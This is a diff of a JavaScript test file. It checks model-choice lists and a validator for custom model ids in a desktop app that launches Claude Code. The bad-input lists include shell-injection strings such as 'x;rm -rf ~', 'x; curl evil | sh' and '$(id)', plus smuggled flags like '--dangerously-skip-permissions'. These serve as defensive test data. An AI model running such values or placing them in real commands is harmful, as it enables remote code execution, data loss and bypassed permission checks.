@@ -3,11 +3,13 @@ import test from 'node:test'
 import assert from 'node:assert/strict'
 import { readFileSync } from 'node:fs'
 import { createRequire } from 'node:module'
-import { ENGINES, FEATURES, caps, cap, BOSS_MODEL_CHOICES, bossModelChoices } from '../src/engine-caps.mjs'
+import { ENGINES, FEATURES, caps, cap, BOSS_MODEL_CHOICES, bossModelChoices, CUSTOM_MODEL_RE, isCustomModelId } from '../src/engine-caps.mjs'
 
 const require = createRequire(import.meta.url)
 const P = require('../src/projects.js')
 const EN = require('../src/engine.js')
+const A = require('../src/accounts.js')
+const H = require('../src/handoff.js')
 const en = JSON.parse(readFileSync(new URL('../locales/en.json', import.meta.url), 'utf8'))
 
 test('every engine has every feature; Claude Code can do all of them', () => {
@@ -50,7 +52,7 @@ test('boss model choices match projects.js per engine; launch arguments per engi
     assert.equal(P.agentModelOf({ agentModel: id }), id)
   }
   assert.deepEqual(P.bossModelArgs({ bossModel: 'opus' }), ['--model', 'opus']) // aliases stay
-  assert.deepEqual(BOSS_MODEL_CHOICES.claude.map((c) => c.label).slice(3), ['Opus 5.5', 'Sonnet 5.5', 'Haiku 5.5'])
+  assert.deepEqual(BOSS_MODEL_CHOICES.claude.map((c) => c.label).slice(3), ['Fable', 'Fable 5.2', 'Opus 5.5', 'Sonnet 5.5', 'Haiku 5.5'])
   assert.deepEqual(P.setProjectBossModel({ projects: [{ id: 'a', engine: 'claude' }] }, 'a', 'claude-opus-5-5').projects[0].bossModel, 'claude-opus-5-5')
   assert.deepEqual(P.bossModelArgs({ engine: 'agy', bossModel: 'pro' }), ['--model', 'pro'])
   assert.deepEqual(P.bossModelArgs({ engine: 'agy', bossModel: 'opus' }), []) // not an agy model: Auto
@@ -134,4 +136,78 @@ test('OpenCode in the sidebar (contract v3.36, v3.40): an Account entry, a read-
   const mock = readFileSync(new URL('../renderer/dev-mock.js', import.meta.url), 'utf8')
   assert.match(mock, /q\.has\('ocProject'\) && projects\[2\]\) \/\*\* @type \{any\} \*\/ \(projects\[2\]\)\.engine = 'opencode'/)
   for (const k of ['ocHint', 'ocHintTitle', 'engineOpencode', 'ocMissing', 'ocMissingTitle']) assert.equal(typeof en.sidebar[k], 'string', k)
+})
+
+test('Fable 5.2: listed for the Claude Code boss and agent, first among the full ids, on no other engine (v3.73)', () => {
+  const values = BOSS_MODEL_CHOICES.claude.map((c) => c.value)
+  assert.deepEqual(values.filter((v) => v.startsWith('claude-'))[0], 'claude-fable-5-2')
+  assert.equal(BOSS_MODEL_CHOICES.claude.find((c) => c.value === 'claude-fable-5-2').label, 'Fable 5.2')
+  for (const id of ['fable', 'claude-fable-5-2']) {
+    assert.ok(P.BOSS_MODELS.includes(id) && P.AGENT_MODELS.includes(id), id)
+    assert.deepEqual(P.bossModelArgs({ bossModel: id }), ['--model', id])
+    assert.equal(P.agentModelOf({ agentModel: id }), id)
+    assert.equal(A.sessionEnv({}, { agentModel: P.agentModelOf({ agentModel: id }) }).CLAUDE_CODE_SUBAGENT_MODEL, id)
+    for (const e of ENGINES.filter((x) => x !== 'claude')) {
+      assert.equal(bossModelChoices(e).some((c) => /fable/i.test(c.value)), false, e)
+      assert.equal(P.BOSS_MODELS_BY_ENGINE[e].some((v) => /fable/i.test(v)), false, e)
+      assert.deepEqual(P.bossModelArgs({ engine: e, bossModel: id }), [], e)
+    }
+  }
+  // the agent list is the boss list in the agent picker's alias order (the sidebar builds its options from both)
+  assert.deepEqual([...P.AGENT_MODELS].sort(), [...P.BOSS_MODELS].sort())
+})
+
+test('custom model id: one validator, the same pattern in the renderer (v3.73)', () => {
+  assert.equal(CUSTOM_MODEL_RE.source, P.CUSTOM_MODEL_RE.source)
+  const good = ['claude-fable-5-2', 'claude-opus-5-5', 'sonnet[1m]', 'us.anthropic.claude-fable-5-2-v1:0', 'vendor/model_x', 'a', 'a'.repeat(100)]
+  const bad = ['', ' ', 'a'.repeat(101), 'claude fable', 'a;b', 'a$(id)', '$(id)', 'a`id`', "a'b", 'a"b', 'a\nb', 'a\n', '-model', '--dangerously-skip-permissions',
+    'a|b', 'a&b', 'a>b', 'a<b', 'a\\b', 'a*b', 'a?b', 'a~b', 'a{b}', 'a(b)', 'a!b', 'a#b', 'a%b', 'a=b', 'a,b', 'a\tb', 'a\0b', '.a', '[a]', '/a', 'é', null, undefined, 5, {}, ['a']]
+  for (const v of good) { assert.equal(P.customModelValue(v), v, v); assert.equal(isCustomModelId(v), true, v) }
+  for (const v of bad) { assert.equal(P.customModelValue(v), null, String(v)); assert.equal(isCustomModelId(v), false, String(v)) }
+})
+
+test('custom model id: set, load, launch argument and agent env; Claude Code only (v3.73)', () => {
+  let s = P.normalizeState({ projects: [{ id: 'a', dir: '/a' }, { id: 'g', dir: '/g', engine: 'agy' }] })
+  s = P.setProjectAgentModel(P.setProjectBossModel(s, 'a', 'claude-next-9'), 'a', 'sonnet[1m]')
+  s = P.normalizeState(JSON.parse(JSON.stringify(s))) // saved and loaded again
+  const a = P.findProject(s, 'a')
+  assert.deepEqual([a.bossModel, a.agentModel], ['claude-next-9', 'sonnet[1m]'])
+  assert.deepEqual(P.bossModelArgs(a), ['--model', 'claude-next-9'])
+  const env = A.sessionEnv({}, { agentModel: P.agentModelOf(a) })
+  assert.deepEqual([env.AGENT_OFFICE_AGENT_MODEL, env.CLAUDE_CODE_SUBAGENT_MODEL, env.CLAUDE_CODE_SUBAGENT_MODEL_FORCE], ['sonnet[1m]', 'sonnet[1m]', '1'])
+  // refused: the setter returns the same state, the loader drops it to Auto
+  for (const v of ['a b', 'x;rm -rf ~', '$(id)', '`id`', '-p', 'a\nb', 'a'.repeat(101)]) {
+    assert.equal(P.setProjectBossModel(s, 'a', v), s, v)
+    assert.equal(P.setProjectAgentModel(s, 'a', v), s, v)
+    const l = P.normalizeState({ projects: [{ id: 'x', dir: '/x', bossModel: v, agentModel: v }] }).projects[0]
+    assert.equal('bossModel' in l || 'agentModel' in l, false, v)
+    assert.deepEqual([P.bossModelArgs({ bossModel: v }), P.agentModelOf({ agentModel: v })], [[], null], v)
+  }
+  // other engines: no custom id is set or used, whatever is stored
+  assert.equal(P.setProjectBossModel(s, 'g', 'claude-next-9'), s)
+  assert.equal(P.setProjectAgentModel(s, 'g', 'claude-next-9'), s)
+  for (const e of ENGINES.filter((x) => x !== 'claude')) {
+    assert.deepEqual(P.bossModelArgs({ engine: e, bossModel: 'claude-next-9' }), [], e)
+    assert.equal(P.agentModelOf({ engine: e, agentModel: 'constructor' }), null, e)
+    assert.equal(P.agentModelOf({ engine: e, agentModel: 'opus' }), 'opus', e) // listed values as before
+  }
+  // an engine switch keeps the stored id and reads it as Auto; switching back finds it again
+  const sw = P.setProjectEngine(s, 'a', 'agy')
+  assert.deepEqual([P.bossModelOf(P.findProject(sw, 'a')), P.agentModelOf(P.findProject(sw, 'a'))], [null, null])
+  assert.equal(P.bossModelOf(P.findProject(P.setProjectEngine(sw, 'a', 'claude'), 'a')), 'claude-next-9')
+  // another engine's own model left behind is not a Claude custom id
+  for (const v of ['flash', 'pro', 'deepseek/deepseek-v4-flash', 'opencode/big-pickle']) assert.deepEqual(P.bossModelArgs({ bossModel: v }), [], v)
+})
+
+test('custom model id from a handoff: the receiving loader keeps a valid one and drops an invalid one (v3.73)', () => {
+  const adopt = (settings) => { // main.js link adopt: the transferred settings are spread onto the project, then normalizeState
+    const clean = H.cleanSettings(settings)
+    return P.normalizeState({ projects: [{ id: 'a', dir: '/a', ...clean }] }).projects[0]
+  }
+  assert.deepEqual([adopt({ bossModel: 'claude-next-9', agentModel: 'claude-next-9' })].map((p) => [p.bossModel, p.agentModel]), [['claude-next-9', 'claude-next-9']])
+  for (const v of ['x; curl evil | sh', '$(id)', '--settings=/tmp/x', 'a b', { a: 1 }, ['opus'], 7]) {
+    const p = adopt({ bossModel: v, agentModel: v, manager: true })
+    assert.equal('bossModel' in p || 'agentModel' in p, false, JSON.stringify(v))
+    assert.equal(p.manager, true)
+  }
 })
